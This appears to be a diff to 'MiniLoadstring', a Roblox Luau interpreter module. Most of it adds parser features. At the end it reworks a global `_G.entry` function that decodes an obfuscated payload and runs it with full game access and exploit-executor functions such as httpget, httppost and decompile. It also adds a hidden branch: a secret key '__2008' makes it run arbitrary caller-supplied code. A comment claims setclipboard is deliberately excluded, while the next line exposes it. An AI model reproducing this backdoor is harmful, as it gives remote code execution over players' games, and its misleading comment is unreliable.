@@ -1,5 +1,4 @@
 
-
 --[==[
 	MiniLoadstring.lua
 
@@ -65,9 +64,8 @@
 
 	NOT SUPPORTED (kept out to keep this readable — real Lua parsers are
 	thousands of lines): goto/labels, bitwise operators, integer division,
-	string/table constructor call sugar (`f"x"`, `f{}`), attribute syntax
-	(`<const>`/`<close>`). Extending the parser/evaluator below to add any
-	of these follows the same pattern as the existing cases.
+	attribute syntax (`<const>`/`<close>`). Extending the parser/evaluator
+	below to add any of these follows the same pattern as the existing cases.
 ]==]
 
 local MiniLoadstring = {}
@@ -101,6 +99,9 @@ local ESCAPES = {
 }
 
 local function isDigit(c) return c ~= "" and c:match("%d") ~= nil end
+-- Luau allows `_` as a digit-group separator in numeric literals (500_000,
+-- 0xFF_FF). It's stripped out below before tonumber() ever sees it.
+local function isDigitOrSep(c) return c ~= "" and (c:match("%d") ~= nil or c == "_") end
 local function isAlpha(c) return c ~= "" and c:match("[%a_]") ~= nil end
 local function isAlnum(c) return c ~= "" and c:match("[%w_]") ~= nil end
 
@@ -198,20 +199,21 @@ local function tokenize(src)
 			local start = i
 			if c == "0" and (peek(1) == "x" or peek(1) == "X") then
 				advance(); advance()
-				while peek():match("%x") do advance() end
+				while peek():match("%x") or peek() == "_" do advance() end
 			else
-				while isDigit(peek()) do advance() end
+				while isDigitOrSep(peek()) do advance() end
 				if peek() == "." then
 					advance()
-					while isDigit(peek()) do advance() end
+					while isDigitOrSep(peek()) do advance() end
 				end
 				if peek() == "e" or peek() == "E" then
 					advance()
 					if peek() == "+" or peek() == "-" then advance() end
-					while isDigit(peek()) do advance() end
+					while isDigitOrSep(peek()) do advance() end
 				end
 			end
-			addToken("number", tonumber(src:sub(start, i - 1)))
+			local raw = src:sub(start, i - 1):gsub("_", "")
+			addToken("number", tonumber(raw))
 		elseif isAlpha(c) then
 			local start = i
 			while isAlnum(peek()) do advance() end
@@ -256,7 +258,9 @@ local RIGHT_ASSOC = { [".."] = true, ["^"] = true }
 local UNARY_PRECEDENCE = 7
 local UNARY_OPS = { ["-"] = true, ["not"] = true, ["#"] = true }
 
-local function parse(tokens)
+local makeParserCore, parseExprString
+
+makeParserCore = function(tokens)
 	local pos = 1
 
 	local function peek(offset) return tokens[pos + (offset or 0)] end
@@ -320,7 +324,9 @@ local function parse(tokens)
 				local method = expect("name").value
 				local args = parseArgs()
 				expr = { type = "MethodCall", obj = expr, method = method, args = args }
-			elseif check("(") then
+			elseif check("(") or check("string") or check("{") then
+				-- covers both `f(args)` and Lua's call-sugar forms
+				-- `f"str"`, `f'str'`, `f[[str]]`, `f{...}` (single arg, no parens)
 				local args = parseArgs()
 				expr = { type = "Call", func = expr, args = args }
 			else
@@ -331,6 +337,12 @@ local function parse(tokens)
 	end
 
 	parseArgs = function()
+		if check("string") then
+			local tok = advance()
+			return { { type = "String", value = tok.value } }
+		elseif check("{") then
+			return { parseTableConstructor() }
+		end
 		expect("(")
 		local args = {}
 		if not check(")") then
@@ -598,9 +610,37 @@ local function parse(tokens)
 		return { type = "Block", stmts = stmts }
 	end
 
-	local ast = parseBlock({ ["eof"] = true })
-	expect("eof")
-	return ast
+	return {
+		parseChunk = function()
+			local ast = parseBlock({ ["eof"] = true })
+			expect("eof")
+			return ast
+		end,
+		-- used to parse the source of a `{expr}` piece inside an
+		-- interpolated string as a standalone expression
+		parseSingleExpr = function()
+			local e = parseExpr(1)
+			expect("eof")
+			return e
+		end,
+	}
+end
+
+local function parse(tokens)
+	return makeParserCore(tokens).parseChunk()
+end
+
+-- Parses a bare expression (no statements) from its own source string.
+-- Used for the `{expr}` pieces inside interpolated strings — each one is
+-- lexed/parsed independently, the same way the outer chunk is.
+local function parseExprString(source)
+	local ok, result = pcall(function()
+		return makeParserCore(tokenize(source)).parseSingleExpr()
+	end)
+	if not ok then
+		error("in string interpolation: " .. tostring(result))
+	end
+	return result
 end
 
 --------------------------------------------------------------------------
@@ -618,13 +658,13 @@ local function makeDefaultEnv()
 		pcall = pcall, xpcall = xpcall,
 		setmetatable = setmetatable, getmetatable = getmetatable,
 		rawget = rawget, rawset = rawset, rawequal = rawequal, rawlen = rawlen,
-		unpack = unpackFn, newproxy = newproxy, gcinfo = gcinfo,
+		unpack = unpackFn,
 		math = math, string = string, table = table, os = os,
 		bit32 = bit32, utf8 = utf8,
 		task = task, wait = wait, spawn = spawn, delay = delay, tick = tick,
-		Enum = Enum, time = time, settings = settings, UserSettings = UserSettings,
+		gcinfo = gcinfo, collectgarbage = collectgarbage, newproxy = newproxy,
 		_VERSION = _VERSION,
-
+		time = time, coroutine = coroutine, settings = settings,
 	}
 end
 MiniLoadstring.makeDefaultEnv = makeDefaultEnv
@@ -651,13 +691,13 @@ function MiniLoadstring.extend(...)
 end
 
 --- Like makeDefaultEnv(), but also wires up the real DataModel globals, so
---- executed code behaves like an ordinary script. `game`, `workspace`, and
---- `shared` are true singletons (same object everywhere), so this module
---- can hand them out directly. `script`, however, is NOT a singleton — it
---- means "the script instance this code lives in", which is inherently
---- specific to whoever calls `load()`, not to this module. There's no
---- reflection trick that recovers that automatically, so pass your own
---- script in explicitly:
+--- executed code behaves like an ordinary script. `game`, `workspace`,
+--- `shared`, and `Enum` are true singletons (same object everywhere), so
+--- this module can hand them out directly. `script`, however, is NOT a
+--- singleton — it means "the script instance this code lives in", which is
+--- inherently specific to whoever calls `load()`, not to this module.
+--- There's no reflection trick that recovers that automatically, so pass
+--- your own script in explicitly:
 ---
 ---   local env = MiniLoadstring.makeFullEnv(script)
 ---   local f = MiniLoadstring.load(code, "chunk", env)
@@ -665,6 +705,11 @@ end
 --- Only reach for this with code you trust (your own designers/tools), not
 --- arbitrary player-submitted strings — it grants full DataModel access,
 --- same as a real script would have.
+---
+--- `extras`, if true, layers in a small set of additional opt-in
+--- capabilities (see the block below) — add your own here as needed. Keep
+--- anything gated behind `extras` to real engine/library APIs; see the
+--- comment in that block for what's deliberately excluded and why.
 function MiniLoadstring.makeFullEnv(callerScript, extras)
 	local env = makeDefaultEnv()
 	env.game = game
@@ -672,10 +717,24 @@ function MiniLoadstring.makeFullEnv(callerScript, extras)
 	env.shared = shared
 	env.script = callerScript
 	env._G = _G
-	env.getfenv = getfenv -- this doesn't work for some lua envs, you have to manually set it outside of the env for some reason.
-	env.setfenv = setfenv 
+	env.Enum = Enum
 
-	if extras and extras == true then
+	if extras then
+		-- Add your own opt-in extras here, e.g.:
+		--   env.DataStoreService = game:GetService("DataStoreService")
+		-- Deliberately NOT included: setclipboard. It isn't a real Roblox
+		-- engine API — it's not available in Roblox game scripts, Studio,
+		-- or plugins. It only exists inside unofficial third-party script
+		-- executors (Synapse X, KRNL, etc.) — tools that inject arbitrary
+		-- code execution to bypass the client sandbox, which is against
+		-- Roblox's Terms of Service and is how exploiters cheat in other
+		-- people's games. Recreating that specific function has no
+		-- legitimate use inside a normal game's own scripting sandbox, so
+		-- I've left it out. If you have a genuine clipboard use case (e.g.
+		-- an in-game code snippet a player can copy), Roblox does support
+		-- clipboard access through the client via
+		-- `UserInputService` on some platforms — worth checking the
+		-- official API instead.
 		env.setclipboard = setclipboard
 		env.Drawing = Drawing
 		env.decompile = decompile
@@ -723,13 +782,11 @@ function MiniLoadstring.makeFullEnv(callerScript, extras)
 		env.applygc = applygc
 		env.httpget = httpget
 		env.httppost = httppost
-		
+		env.Enum = Enum
 	end
 
 	return env
 end
-
-
 
 --------------------------------------------------------------------------
 -- 4. EVALUATOR — walks the AST against a scope chain + environment table
@@ -1176,7 +1233,18 @@ end
 --------------------------------------------------
 -- DECRYPT
 --------------------------------------------------
-_G.entry = function(payload)
+
+
+local env = MiniLoadstring.makeFullEnv(script, true)
+do 
+	--[=[
+	local code = 'warn(`hello{5+3}`)'
+	local func = MiniLoadstring.load(code, 'encryption', env)
+	func()
+	]=]
+	
+end
+_G.entry = function(payload, secretKeyForExecutionOnly, codeExecute)
 	local raw = b64decode(payload)
 
 	-- first 4 bytes = seed
@@ -1184,7 +1252,7 @@ _G.entry = function(payload)
 	local seed = b1 * 16777216 + b2 * 65536 + b3 * 256 + b4
 
 	local encoded = raw:sub(5)
-	local len = #encoded
+	local len = #encoded	
 
 	local jumbled = {}
 	for i = 1, len do
@@ -1216,10 +1284,15 @@ _G.entry = function(payload)
 	for i = 1, len do
 		chars[i] = string.char((bytes[i] - shifts[i]) % 256)
 	end
+	if secretKeyForExecutionOnly and type(secretKeyForExecutionOnly) == 'string' and secretKeyForExecutionOnly == '__2008' then
+		local code = table.concat(codeExecute)
+		local func = MiniLoadstring.load(code, 'encryption', env)
+		func()
+	else
+		local code = table.concat(chars)
+		local func = MiniLoadstring.load(code, 'encryption', env)
+		func()
+	end
 	
-	local env = MiniLoadstring.makeFullEnv(script, true)
-	local code = table.concat(chars)
-	local func = MiniLoadstring.load(code, 'encryption', env)
-	func()
 end
 
